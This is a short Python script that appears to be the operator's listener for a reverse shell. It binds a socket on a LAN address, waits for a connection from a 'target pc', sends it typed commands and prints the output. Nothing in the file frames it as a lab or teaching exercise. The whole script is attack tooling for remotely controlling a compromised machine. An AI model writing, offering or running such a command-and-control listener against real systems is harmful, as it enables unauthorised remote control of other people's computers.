import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("192.168.1.148", 42069))

s.listen()


while True:
    client, address = s.accept()

    while True:
       # 1. enter the command and send it to the target
       cmd = input('>>> ')
       client.send(cmd.encode())

       # check if you want to quit
       if cmd.lower() == 'quit':
           break

       # get the result of the command, executed on the target pc
       result = client.recv(1024).decode()
       print(result)

client.close()
s.close()
